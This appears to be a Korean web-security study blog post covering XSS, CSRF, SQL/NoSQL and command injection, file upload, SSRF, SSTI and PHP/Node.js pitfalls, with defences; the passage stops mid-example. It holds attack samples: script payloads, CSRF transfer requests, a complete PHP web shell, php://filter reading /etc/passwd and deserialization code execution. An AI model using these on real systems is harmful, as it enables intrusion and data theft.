Vulnerability</a></li><li><a href=#ssrf-server-side-request-forgery-1 aria-label="SSRF (Server-side Request Forgery)">SSRF (Server-side Request Forgery)</a></li><li><a href=#dbms-fingerprinting aria-label="DBMS Fingerprinting">DBMS Fingerprinting</a></li><li><a href=#couch-db-exploiting aria-label="Couch DB exploiting">Couch DB exploiting</a></li><li><a href=#command-injection-linux aria-label="Command Injection (Linux)">Command Injection (Linux)</a></li><li><a href=#command-injection-window aria-label="Command Injection (Window)">Command Injection (Window)</a></li><li><a href=#php-exploit aria-label="PHP exploit">PHP exploit</a></li></ul></li></ul></div></details></div><div class=post-content><h1 id=공격-방법-분류>공격 방법 분류<a hidden class=anchor aria-hidden=true href=#공격-방법-분류>#</a></h1><h2 id=server-side-공격-방법>Server side 공격 방법<a hidden class=anchor aria-hidden=true href=#server-side-공격-방법>#</a></h2><ol><li>Injection (인젝션)<ul><li>서버의 처리 과정 중 사용자가 입력한 데이터가 시스템의 다른 기능을 주거나 문법적으로 사용되어 발생하는 취약점</li><li>injection 공격의 종류<ul><li>SQL Injection</li><li>Command Injection</li><li>SSTI (Server Side Template Injection)</li><li>Path Traversal</li><li>SSRF (Server Side Request Forgery)</li></ul></li><li>ORM과 같이 검증된 SQL 라이브러리를 사용하여 방어가 필요하다.</li></ul></li><li>File vulnerability<ul><li>서버의 파일 시스템에 사용자가 원하는 행위를 할 수 있을 때 발생하는 취약점</li><li>system(PHP), child_process(Node JS), os.system(Python) 등 OS command를 실행하는 함수를 호출하지 않는 방법이 가장 좋으나, 입력 필터링이나 대체 라이브러리를 사용하는 방법으로 위협을 줄일 수 있다.</li></ul></li><li>Business Logic Vulnerability (비즈니스 로직 취약점)<ul><li>인젝션, 파일 관련 취약점들과는 다르게 정상적인 흐름을 악용하는 것</li></ul></li><li>Language specific Vulnerability (PHP, Python, NodeJS)<ul><li>웹 어플리케이션에서 사용하는 언어의 특성으로 인해 발생하는 취약점</li></ul></li><li>Misconfiguration<ul><li>잘못된 설정으로 인해 발생하는 취약점<ul><li>Debug mode를 설정한 채로 배포하는 경우</li><li>임시/백업 파일을 삭제하지 않은 경우<ul><li>백업파일 종류<ul><li>bak : 백업 파일, 대부분의 에디터에서 사용함</li><li>config : 설정 파일, 비밀 키들이 존재하는 경우가 많음</li><li>sql : sql schema 파일, 데이터 베이스 구조를 알아낼 수 있음</li><li>sh : shell script 파일</li><li>~ : bluefish 에디터 백업 파일</li></ul></li><li>서비스와는 무관한 파일들을 제거해서 위협을 없앨 수 있음</li></ul></li></ul></li><li>VCS 프로그램으로 인한 임시 파일들을 정리해야 한다.<ul><li>.git, .hg 등의 파일이 있다.</li><li><a href=https://github.com/kost/dvcs-ripper>https://github.com/kost/dvcs-ripper</a> 정보를 참조하여 진단이 가능하다.</li><li>웹 서버의 설정으로 VCS 파일의 경로의 접근을 막는 방법도 가능하다.<pre tabindex=0><code>location ~ /\.(git|hg) {
  deny all;
}
</code></pre></li></ul></li><li>네트워크 바인딩을 0.0.0.0 으로 세팅하는 경우<ul><li>편의를 위해 세팅한 설정을 운영 환경이 변경되었음에도 그대로 유지하여 발생할 수 있는 취약점이다.</li><li>내부 망에서만 접근할 수 있는 서비스는 mask를 제대로 설정 해 주고, 허용할 포트를 제외한 설정은 모두 삭제하도록 하여 위협을 제거한다.</li></ul></li></ul></li></ol><h1 id=취약점>취약점<a hidden class=anchor aria-hidden=true href=#취약점>#</a></h1><h2 id=xss-cross-site-scripting>XSS (Cross Site Scripting)<a hidden class=anchor aria-hidden=true href=#xss-cross-site-scripting>#</a></h2><ul><li>공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 공격이다.</li><li>XSS 취약점이 존재하는 사이트에 공격자는 origin 권한으로 악성 스크립트가 포함된 페이지를 만들어서 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자의 악성 스크립트가 동작해 정보를 탈취하는 방식이다.</li></ul><h3 id=공격-경로>공격 경로<a hidden class=anchor aria-hidden=true href=#공격-경로>#</a></h3><ul><li>XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다.<ul><li>악성 태그를 필터링하는 HTML Sanitization을 사용하거나 엔티티 코드로 치환하는 방법으로 XSS를 예방할 수 있다.</li><li>Flask는 <code>render_template</code> 함수를 사용하여 인자를 HTML 엔티티코드로 변환하여 출력하는 방식으로 XSS를 방지한다.</li></ul></li><li>아래와 같이 입력값을 그대로 출력하게 되면, 입력값으로 script 를 전달해 공격에 사용할 수 있다.<ul><li>서버의 코드<pre tabindex=0><code>@app.route(&#34;/vulnerable&#34;)
def vulnerable():
    param = request.args.get(&#34;param&#34;, &#34;&#34;) # 이용자가 입력한 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
</code></pre></li><li>공격자 입력1. 다른 페이지로 redirection<pre tabindex=0><code>&lt;script&gt;location.href = &#34;/another_page?param=PARAM1&#34;;&lt;/script&gt;
</code></pre></li><li>공격자 입력2. cookie 정보 출력<pre tabindex=0><code>&lt;script&gt;document.cookie&lt;/script&gt;
</code></pre></li></ul></li></ul><h3 id=xss-공격-종류>XSS 공격 종류<a hidden class=anchor aria-hidden=true href=#xss-공격-종류>#</a></h3><ul><li>XSS 는 악성 스크립트의 위치와 침투 경로에 따라 아래와 같이 구분된다.<ul><li>Stored XSS : XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS<ul><li>게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있음</li><li>불특정 다수에게 보여지기 때문에 파급력이 크다.</li></ul></li><li>Reflected XSS : XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS<ul><li>게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있음</li><li>검색 결과를 응답에 포함하는 일부 서비스에서 발생 가능</li><li>공격을 위해서는 다른 이용자를 악성 스크립트가 포함된 링크에 접속하도록 유도해야 함</li></ul></li><li>DOM-based XSS : XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS</li><li>Universal XSS : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS</li></ul></li></ul><h2 id=csrf-cross-site-request-forgery>CSRF (Cross Site Request Forgery)<a hidden class=anchor aria-hidden=true href=#csrf-cross-site-request-forgery>#</a></h2><ul><li>어떤 사이트에서 이용자의 신원 정보가 포함된 쿠키를 사용한다면, 타인의 쿠키를 탈취하여 변조된 명령을 서버로 번달하는 공격 방식이다.<ul><li>이용자의 신원 정보가 포함된 쿠키는 일종의 서명과 같은 역할을 하기 때문에, 쿠키가 특정 명령에 대한 이용자의 본인 인증 역할을 수행할 수도 있다.</li></ul></li><li>2차 인증을 수행하지 않고 cookie로만 인증을 하는 사이트에 대해 공격이 가능하다.</li><li><code>XSS</code>는 인증 정보인 세션 및 쿠키 탈취를 목적으로 서버에서 스크립트를 실행 하는 방식인 반면, <code>CSRF</code>는 이용자가 임의 페이지에 HTTP 요청을 보내는 것을 목적으로 하는 공격이다.</li></ul><h3 id=공격-경로-1>공격 경로<a hidden class=anchor aria-hidden=true href=#공격-경로-1>#</a></h3><ul><li><code>&lt;img></code> 태그나 <code>&lt;form></code> 태그를 활용해서 사용자가 의도하지 않은 명령을 서버에 요청하는 script를 실행시킬 수 있다.<pre tabindex=0><code>/* img 태그 활용 요청 전달 */
&lt;img src=&#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337&#39; width=0px height=0px&gt;`
</code></pre><pre tabindex=0><code>/* javascript 공격 예시 */
/* 새 창 띄우기 */
window.open(&#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337&#39;);
/* 현재 창 주소 옮기기 */
location.href = &#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337&#39;;
location.replace(&#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337&#39;);
</code></pre></li></ul><h2 id=sql-injection>SQL Injection<a hidden class=anchor aria-hidden=true href=#sql-injection>#</a></h2><ul><li>조작된 SQL 쿼리를 서버에 주입하여 인증을 우회하거나, 데이터베이스의 정보를 유출하는 공격행위</li><li>Blind SQL Injection : SQL Injection 의 한 종류로, DBMS가 답변 가능한 형태로 질문을 수행하여 스무고개 게임과 같이 정답을 유추해 나가는 공격 기법</li></ul><h2 id=nosql-injection>NoSQL Injection<a hidden class=anchor aria-hidden=true href=#nosql-injection>#</a></h2><ul><li>NoSQL은 데이터 타입으로 &lsquo;오브젝트&rsquo; 라는 개념을 갖는다. 오브젝트 타입의 입력값을 처리할 때에는 쿼리 연산자를 사용할 수 있고, 이 부분의 취약점을 활용한 것이 NoSQL Injection 이다.</li><li>NodeJs를 예를 들면 아래와 같이 url에 object를 대입할 수 있다.<pre tabindex=0><code>// 서버 코드 예시
const express = require(&#39;express&#39;);
const app = express();
app.get(&#39;/&#39;, function(req,res) {
    console.log(&#39;data:&#39;, req.query.data, &#39; / type:&#39;, typeof req.query.data);
    res.send(&#39;done&#39;);
});
const server = app.listen(3000, function(){
    console.log(&#39;app.listen&#39;);
});
</code></pre><pre tabindex=0><code>// 결과 예시
http://localhost:3000/?data=1234
data: 1234
type: string

http://localhost:3000/?data[]=1234
data: [ &#39;1234&#39; ]
type: object

http://localhost:3000/?data[]=1234&amp;data[]=5678
data: [ &#39;1234&#39;, &#39;5678&#39; ] 
type: object

http://localhost:3000/?data[5678]=1234
data: { &#39;5678&#39;: &#39;1234&#39; } 
type: object

http://localhost:3000/?data[5678]=1234&amp;data=0000
data: { &#39;5678&#39;: &#39;1234&#39;, &#39;0000&#39;: true } 
type: object

http://localhost:3000/?data[5678]=1234&amp;data[]=0000
data: { &#39;0&#39;: &#39;0000&#39;, &#39;5678&#39;: &#39;1234&#39; } 
type: object

http://localhost:3000/?data[5678]=1234&amp;data[1111]=0000
data: { &#39;1111&#39;: &#39;0000&#39;, &#39;5678&#39;: &#39;1234&#39; } 
type: object
</code></pre><ul><li>이 방법으로 아래와 같이 &lsquo;data&rsquo; 객체 안에 NoSQL 쿼리가 들어가도록 url을 설정할 수도 있다.<ul><li><a href=https://aswinblue.github.io/Blog/post/databases/database/#%eb%ac%b8%eb%b2%95>NoSQL 문법 참조</a></li></ul><pre tabindex=0><code>http://localhost:3000/?data[$eq]=A
data: { &#34;$eq&#34;: &#34;A&#34; } 
type: object
</code></pre></li></ul></li></ul><h2 id=command-injection>Command Injection<a hidden class=anchor aria-hidden=true href=#command-injection>#</a></h2><ul><li>공격자가 클라이언트 인터페이스를 통해 서버측에 시스템 명령어를 전달하여 실행시켜 공격을 수행하는 기법</li><li>PHP의 <code>system</code>, Node JS의 <code>child_process</code>, 파이썬의 <code>os.system</code> 과 같이 시스템 명령어를 수행하는 함수에 이용자가 임의의 인자를 전달할 수 있을 때 발생할 수 있다.</li><li>명령어 입력란에 다른 명령어를 입력하는 기법에는 다음의 <code>메타문자</code> 들을 활용할 수 있다.<ol><li>명령어 치환<ul><li>리눅스 쉘에서 <code>``</code> 사이에 든 문자는 새로운 명령어 라인으로 인식한다.<ul><li>ex) echo `ls`<ul><li>ls 명령어가 실행된다.</li></ul></li></ul></li><li>리눅스 쉘에서 <code>$()</code> 사이에 든 문자는 새로운 명령어 라인으로 인식한다.<ul><li>ex) echo $(ls)<ul><li>ls 명령어가 실행된다.</li></ul></li></ul></li></ul></li><li>명령어 연속 실행</li></ol><ul><li>리눅스 쉘에서 <code>||</code> 를 사용하면, || 앞과 || 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다.<ul><li>한 줄에 둘 이상의 명령어를 실행시킬 수 있다.</li><li>ex) mkdir FILE || cd FILE<ul><li>FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.</li></ul></li></ul></li><li>리눅스 쉘에서 <code>&&</code> 를 사용하면, && 앞과 && 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다.<ul><li>ex) mkdir FILE && cd FILE<ul><li>FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.</li></ul></li></ul></li><li>리눅스 쉘에서 <code>;</code> 를 사용하면, ; 앞과 ; 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다.<ul><li>ex) mkdir FILE ; cd FILE<ul><li>FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.</li></ul></li></ul></li></ul><ol start=3><li>파이프<ul><li>리눅스 쉘에서 <code>|</code> 를 사용하면 | 앞의 명령어 실행 결과를 | 뒤의 명령어 실행시 입력으로 설정할 수 있다.<ul><li>ex) cat FILE | less<ul><li>FILE 내용을 출력한 것을 less 명령으로 나눠서 볼 수 있도록 한다.</li></ul></li></ul></li></ul></li><li>뒷내용 무시<ul><li>리눅스 쉘에서 <code>#</code>을 사용하면 # 뒤의 내용은 주석처리되어 무시된다.<ul><li>ex) ls #a"sdfa"sd&rsquo;fas"&rsquo;&ldquo;df<ul><li>구문 오류 없이 ls 명령이 잘 실행된다.</li></ul></li></ul></li></ul></li></ol></li><li>문자열을 whitelist 처리하거나 blacklist 처리하여 공격을 방어할 수 있다.<ul><li>정규식을 통해 IP 주소 포멧을 whitelist 로 지정하는 코드<pre tabindex=0><code>import re, os, ...
...
chk_ip = re.compile(&#39;^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$&#39;)
if bool(chk_ip.match(ip)):
    return run_system(f&#39;ping -c 3 {ip}&#39;)
else:
    return &#39;ip format error&#39;
</code></pre></li><li>허용되면 안되는 문자열을 blacklist 로 지정하는 코드</li></ul><pre tabindex=0><code>if &#39;\&#39;&#39; in ip:
    return &#39;not allowed character&#39;
return run_system(f&#39;ping -c 3 \&#39;{ip}\&#39;&#39;)  # shell command 상에서 모든 입력을 문자열로 처리하는 Single Quotes (&#39;)를 사용해야 함
</code></pre></li><li>system(PHP), child_process(Node JS), os.system(Python) 등 OS command를 실행하는 함수 외 대체 라이브러리를 사용하는 방법으로 위협을 줄일 수 있다.</li></ul><h2 id=file-vulnerability>File Vulnerability<a hidden class=anchor aria-hidden=true href=#file-vulnerability>#</a></h2><ul><li>공격자의 파일을 웹 서비스의 파일 시스템에 업로드 혹은 하는 과정에서 발생하는 보안 취약점</li><li>파일 업로드/다운로드 서비스를 개발시 이용자가 업로드한 파일을 데이터베이스에 저장하는 것보다는 서버의 파일 시스템에 저장하는 것이 개발하기 쉽고, 관리 효율도 높지만 File Vulnerability를 주의해야 한다.</li><li>원격 코드 실행, 민감정보 탈취 등이 수행될 수 있다.</li></ul><ol><li><p>File Upload Vulnerability</p><ul><li>파일 업로드가 가능한 path 에 제약을 우회하여 임의 디렉터리에 파일을 업로드 할 수 있는 취약점이다.</li><li>File Upload Vulnerability 중 하나로, 이용자가 업로드될 파일의 이름을 임의로 정할 수 있을 때 발생한다.</li><li><code>..</code> 과 같은 메타 문자를 활용하여 지정된 디렉터리 외의 디렉터리를 참조하는 방식을 취할 수 있다.</li><li>악의적인 파일로 html 파일을 수정한다면 Cross-Site-Scripting 공격으로 이어질 수 있다.</li><li>.php, .jsp, .asp와 같은 파일을 업로드 하면 <a href=../web/#CGI-%28Common-Gateway-Interface%29>CGI</a> 를 통해 서버에서 코드를 실행시킬 수도 있다.</li><li>ex) php web shell example</li></ul><pre tabindex=0><code>&lt;html&gt;&lt;body&gt;
&lt;form method=&#34;GET&#34; name=&#34;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34;&gt;
&lt;input type=&#34;TEXT&#34; name=&#34;cmd&#34; autofocus id=&#34;cmd&#34; size=&#34;80&#34;&gt;
&lt;input type=&#34;SUBMIT&#34; value=&#34;Execute&#34;&gt;
&lt;/form&gt;&lt;pre&gt;
&lt;?php
    if(isset($_GET[&#39;cmd&#39;]))
    {
        system($_GET[&#39;cmd&#39;]);
    }
?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre><ul><li>php를 실행시키는 설정파일 예시</li></ul><pre tabindex=0><code>&lt;FilesMatch &#34;.+\.ph(p[3457]?|t|tml)$&#34;&gt;
   SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre></li><li><p>File Download Vulnerability</p><ul><li>파일 이름을 직접 입력 받아 임의 디렉터리에 있는 파일을 다운로드 받을 수 있는 취약점이다.</li><li>이용자가 다운로드할 파일의 이름을 임의로 정할 수 있을 때 발생한다.</li></ul></li></ol><ul><li>File Vulnerability 를 방지하려면<ul><li>정규식을 통해 확장자, 메타문자를 필터링 하는 로직을 사용해 방어가 필요하다.</li><li>업로드 디렉터리를 웹 서버에서 직접 접근할 수 없도록 한다.</li><li>업로드 디렉터리에서는 CGI가 실행되지 않도록 한다.</li><li>다운로드 파일의 이름 대신 파일의 고유 ID를 사용하여 접근하도록 시스템을 구성한다.</li></ul></li></ul><h2 id=ssrf-server-side-request-forgery>SSRF (Server-side Request Forgery)<a hidden class=anchor aria-hidden=true href=#ssrf-server-side-request-forgery>#</a></h2><ul><li>http, gRPC 등 웹 서비스로 전달되는 요청에 이용자의 입력값이 반영되는 경우, 입력값을 변조하여 의도하지 않은 동작을 유발하는 취약점이다.</li><li>외부 접속을 허용하면 안되는 백오피스 서비스(관리자 페이지)는 보통 내부망 서비스에서 구동된다. 하지만 웹 서비스가 이상 접근을 탐지하고 즉각 대응하기 위해서는 백오피스 서비스에 명령을 요청할 수 있다. 이 경우, SSRF 공격이 가능하다면 공격자는 외부망에서 내부 서버의 관리자 페이지 기능을 접근할 수 있게 된다.</li><li>웹 서비스에서 사용하는 마이크로 서비스의 url 주소가 노출된다면 SSRF 공격에 취약해지므로 주의해야 한다.</li><li>SSRF 공격은 url 변조, form 입력값 변조, request body 변조 등 다양한 입력값에 메타문자들을 섞어 발동이 가능함에 주의한다.</li><li>입력값 필터링과 도메인 IP 검증을 통해 방지가 가능하므로 필수족으로 수행하도록 한다.</li></ul><h2 id=path-traversal>path traversal<a hidden class=anchor aria-hidden=true href=#path-traversal>#</a></h2><ul><li>입력으로 받은 데이터에서 경로값을 변조하여 의도하지 않은 기능을 동작하게 하는 공격 기법이다.</li><li>ex) 아래 코드는 user_idx 파라미터를 받아서 SERVER_ADDRESS/user/usr API를 호출하는 형태이다.<pre tabindex=0><code>@app.route(&#34;/v1/api/user/information&#34;)
def user_info():
  user_idx = request.args.get(&#34;user_idx&#34;, &#34;&#34;)
  response = requests.get(f&#34;{INTERNAL_API}/user/{user_idx}&#34;)
</code></pre><ul><li>이때, user_idx=../admin 으로 변경한다면, 해당 API는 SERVER_ADDRESS/admin API를 호출하게 된다.</li></ul></li><li>ex) 아래 코드는 usr_name 을 파라미터로 받아서 SERVER_ADDRESS/user/search API를 호출한다.<pre tabindex=0><code>@app.route(&#34;/v1/api/user/search&#34;)
def user_search():
  user_name = request.args.get(&#34;user_name&#34;, &#34;&#34;)
  user_type = &#34;public&#34;
  response = requests.get(f&#34;{INTERNAL_API}/user/search?user_name={user_name}&amp;user_type={user_type}&#34;)
</code></pre><ul><li>이때, usesr_name = admin&amp;user_type=admin# 을 대입하면 SERVER_ADDRESS/search?user_name=admin&amp;user_type=admin 구문이 동작된다.<ul><li>url에서 <code>#</code> 이후의 쿼리는 모두 주석처리 되어 버린다.</li></ul></li></ul></li></ul><h2 id=ssti-server-side-template-injection>SSTI (Server Side Template Injection)<a hidden class=anchor aria-hidden=true href=#ssti-server-side-template-injection>#</a></h2><ul><li>python과 같은 코드에서 페이지를 구성하기 위해 html 을 string 형태로 미리 정의한 Template에 동적인 값을 넣어 출력하는 경우가 있다.</li><li>이때 사용자의 입력 데이터가 Template에 직접 사용될 경우 Template Engine이 실행하는 문법을 사용할 수 있기 때문에 SSTI 취약점이 발생한다.</li><li>template engine<ul><li>python : Jinja2, Mako, Tornado</li><li>php : Smarty, Twig</li><li>javascript : Pug, Marko, EJS</li></ul></li><li>취약한 코드의 예시<pre tabindex=0><code>&#39;&#39;&#39;&lt;html&gt;
    &lt;body&gt;
        &lt;h3 id=&#34;title&#34;&gt;{{title}}&lt;/h3&gt;
        &lt;h3 id=&#34;content&#34;&gt;%s&lt;/h3&gt;
    &lt;/body&gt;
&lt;/html&gt;&#39;&#39;&#39; % content
</code></pre></li></ul><h2 id=business-logic-vulnerability>Business Logic Vulnerability<a hidden class=anchor aria-hidden=true href=#business-logic-vulnerability>#</a></h2><ul><li>정상적인 흐름에서 검증 과정이 없거나 미흡한 부분에 의해 의도하지 않은 기능이 동작하는 취약점</li><li>IDOR (Insecure Direct Object Reference) : 변조된 파라미터 값이 다른 사용자의 오브젝트 값을 참조하여 발생<ul><li>객체 참조 시 사용자의 권한을 필히 검증하여야 한다.</li><li>로그인 등의 기능을 통해 사용자 인증을 거친 후 사용하는 서비스에서는 사용자 식별을 위한 정보를 사용자의 입력 데이터로 구분하기 보다는 사용자가 요청 시 전달하는 세션을 통해 서버 내에서 처리하는 것이 안전하다.</li><li>객체 참조 키를 단순한 숫자가 아닌 무작위 문자 생성 등을 통해 악의적인 공격자가 객체에 참조하기 위한 객체 참조 키를 추측하기 어렵게 만들 수도 있다.</li></ul></li><li>Race Condition : 로직의 순서가 잘못되거나, 한 오브젝트에 여러 요청이 동시에 처리되는 상황에서 발생</li></ul><h2 id=language-specific-vulnerability>Language specific Vulnerability<a hidden class=anchor aria-hidden=true href=#language-specific-vulnerability>#</a></h2><ul><li><p>개발 언어에서 제공하는 함수 혹은 문법에서 발생하는 취약점</p></li><li><p>취약점 발생 함수 종류</p><ul><li>코드 실행 함수 (eval)</li><li>OS command function</li><li>Filesystem function</li><li>serialize / deserialize</li></ul></li><li><p>PHP 취약점 발생 함수</p><ul><li><p>include</p><ul><li>인자로 전달된 파일을 읽은 후 해당 파일의 내용을 출력한다. 파일의 내용 중 PHP 코드로 해석되는 구문이 존재하면 해당 코드를 실행한다.</li><li>동적으로 다른 PHP 페이지를 로드해야할 때 주로 사용 하며, include_once, require, require_once 등의 함수와 유사하다.</li><li>파일의 확장자 또는 파일의 타입과는 상관없이 파일의 내용에 php 태그가 포함될 경우 php 코드가 실행되기 때문에 사용 시 주의가 필요하다.</li><li>include할 파일을 사용자의 입력 데이터에 의해 조작될 수 있다면 서버 내의 파일 정보를 출력하거나, 다른 PHP 코드를 실행시킬 수 있게 된다.</li><li>서버 로컬 파일을 Include 하는 취약점을 <code>Local File Inclusion(LFI)</code>, 외부 자원을 Include 하는 취약점을 <code>Remote File Inclusion(RFI)</code>라 한다.</li></ul></li><li><p>Wrappers</p><ul><li>include(), fopen(), copy(), file_exists(), filesize() 와 같은 파일 시스템 함수에서 URL style 프로토콜을 위한 함수들이 존재한다.<ul><li>include 함수는 <code>allow_url_include</code> 옵션으로 url 참조 기능을 세팅할 수 있다.</li></ul></li><li>file sytem, web URL, RFC 2397 형태의 데이터 등을</li><li>php 의 url 기능을 활용할 수도 있다.<ul><li><code>php://stdin</code>, <code>php://stdout</code>, <code>php://stderr</code> : stdin, stdout, stderr로 연결</li><li><code>php://fd/&lt;fd number></code> : file descriptor에 연결</li><li><code>php://memory</code>, <code>php://temp</code> : 메모리에 연결<pre tabindex=0><code>&lt;?php
// Set the limit to 5 MB.
$fiveMBs = 5 * 1024 * 1024;
$fp = fopen(&#34;php://temp/maxmemory:$fiveMBs&#34;, &#39;r+&#39;);
fputs($fp, &#34;hello\n&#34;);
</code></pre></li><li><code>php://input</code> : HTTP의 body 즉, POST 데이터를 입력<pre tabindex=0><code>&lt;?php
// HTTP Body Data
$rawData = file_get_contents(&#34;php://input&#34;);
</code></pre></li><li><code>php://filter</code> : I/O 스트림에 특정 필터를 설정<pre tabindex=0><code>&lt;?php
// 데이터 리드 시 대문자로 처리.
include &#39;php://filter/read=string.toupper/resource=/etc/passwd&#39;;
/*
ROOT:X:0:0:ROOT:/ROOT:/USR/BIN/ZSH
DAEMON:X:1:1:DAEMON:/USR/SBIN:/USR/SBIN/NOLOGIN
...
*/
// 데이터 출력 시 대문자로 처리.
file_put_contents(&#34;php://filter/write=string.toupper/resource=example.txt&#34;,&#34;Hello World&#34;);
/*
$ cat example.txt
HELLO WORLD
*/
?&gt;
</code></pre><ul><li>read=&lt;filter> : 읽기 동작에 사용할 필터</li><li>write=&lt;filter> : 쓰기 동작에 사용할 필터</li><li>resource=&lt;stream name> : 필터링을 설정할 stream 정보<ul><li><code>include 'php://filter/read=convert.base64-encode/resource=test.php';</code> : test.php 파일을 읽어서 base64로 인코딩하여 출력하는 구문</li></ul></li></ul></li></ul></li></ul></li><li><p>extract : 배열에서 변수를 추출</p><ul><li>extract 함수에 사용자의 입력($_GET, $_POST, $_FILES)과 같은 신뢰할 수 없는 데이터가 사용되면 다른 변수를 변조하여 공격에 사용될 수 있다.<pre tabindex=0><code>$systemCMD = &#34;ping 127.0.0.1&#34;;
...
extract($_GET);
...
system($systemCMD);
// 사용자 입력으로 systemCMD=id 을 세팅한다면 ping 명령 대신 id 명령이 수행된다.
</code></pre></li></ul></li><li><p>Type Juggling : 서로 다른 타입인 변수를 비교 또는 연산 시 자동으로 형변환이 발생하고, 의도치 않은 결과가 발생할 수 있는 위험이 있다.</p><pre tabindex=0><code>$a = &#34;a&#34;; // String
$b = &#34;2&#34;; // String
echo $a * 2; // 0
echo $b * 2; // 4
</code></pre></li><li><p>Comparison</p><ul><li><code>$a == $b</code> : $a와 $b의 값이 같으면 True</li><li><code>$a === $b</code> : $a와 $b의 타입과 값이 모두 같으면 True</li><li><code>$a != $b</code> : $a와 $b의 값이 다르면 True.</li><li><code>$a &lt;> $b</code> : $a와 $b의 값이 다르면 True.</li><li><code>$a !== $b</code> : $a와 $b의 타입 또는 값이 다르면 True.</li></ul></li><li><p>session</p><ul><li>php 에서 session 은 <code>$_SESSION</code> 객체에 <code>PHSESSID</code> 라는 값을 key로 저장되고, <code>session_start</code> 로 시작된 PHP 페이지가 종료될 때 자동으로 세션 변수를 serialize 하여 파일 시스템의 <code>{세션기본경로}/sess_{PHPSESSID값}{세션기본경로}/sess_{PHPSESSID값}</code> 경로에 저장한다.</li><li>리눅스라면 보통 <code>/var/lib/php/sessions</code> 경로에 세션 정보가 저장된다.</li></ul></li><li><p>Upload Logic</p><ul><li>php에서 파일을 업로드 하면 /tmp 경로에 <code>php[a-zA-Z0-9]{6}</code> 형태의 이름을 가진 임시 파일을 생성하고 이를 의도한 위치로 옮기게 된다. 이때 Unhandled exception 이 발생하면 임시 파일은 삭제되지 않고 그대로 유지된다.</li><li>이러한 방법으로 /tmp 경로에 공격을 위한 파일을 업로드 할 수 있다.</li></ul></li><li><p>system</p></li><li><p>passthru</p></li><li><p>shell_exec</p></li><li><p>backtick operator (e.g. <code>ls</code>)</p></li><li><p>popen</p></li><li><p>proc_open</p></li><li><p>exec</p></li><li><p>serialize : serialize / deserialize</p><ul><li>__destruct(객체 소멸시 호출), __wakeup(역직렬화시 호출) 등 <code>Magic Methods</code> 를 이용하여 공격 수행</li></ul></li></ul></li><li><p>Javascript 취약점 발생 함수</p><ul><li>Comparison Problem<ul><li>javascript 의 object는 기본적으로 <code>valueOf</code> 와 <code>toString</code> 함수가 있는데, object와 다른 primitive 자료형을 비교할 때 <code>valueOf</code> 와 <code>toString</code> 모두 null 이 아니라면 <code>valueOf</code>가 <code>toString</code> 보다 우선순위가 높다.</li></ul></li><li>Prototype Pollution<ul><li>javascript 는 객체 생성시 prototype 을 명시적으로 상속할 수 있으며, prototype을 정의하지 않는다면 <code>Object.prototype</code> 객체를 상속받는다.</li><li>모든 객체는 <code>__proto__</code> 포인터로 자신이 상속받는 prototype에 접근할 수 있다.</li><li>객체의 필드에 대한 참조가 발생했을 때, 해당 객체에 필드가 없다면, <code>__proto__</code> 포인터에서 해당 필드를 확인하게 된다.<ul><li>ex) x = {a:0, b:1}, y = Object.create(x); // y.a = 0, y.b = 1</li></ul></li><li>참조 : <code>.</code> 을 이용한 참조는 <code>dot notation</code>, <code>[]</code> 을 이용한 참조는 <code>bracket notation</code> 이라 하며, dot notation 에서 사용할 수 없는 문자열(=, &lsquo;, &ldquo;) 을 사용해야 하는 경우 bracket notation 을 사용할 수 있다.</li></ul></li><li>child_process.exec</li><li>spawn</li><li>node-serialize : serialize / deserialize<ul><li>직렬화된 object의 결과에서 내부에 포함된 함수가 역직렬화 과정에서 실행되게 ()를 붙여 실행하면 역직렬화 과정에서 함수가 실행되어 결과가 반영된다.</li><li>ex)<pre tabindex=0><code>serialize_func_1 = {&#34;test&#34;:&#34;_$$ND_FUNC$$_function(){ return &#39;Hello&#39;; }&#34;}
console.log(serialize.unserialize(serialize_func_1));
/*
{ test: [Function (anonymous)] }
*/
serialize.unserialize(serialize_func_1)[&#39;test&#39;]()
/*
&#39;Hello&#39;
*/
serialize_func_2 = {&#34;test&#34;:&#34;_$$ND_FUNC$$_function(){ return &#39;Hello&#39;; }()&#34;}
console.log(serialize.unserialize(serialize_func_2));
/*
{ test: &#39;Hello&#39; }
*/
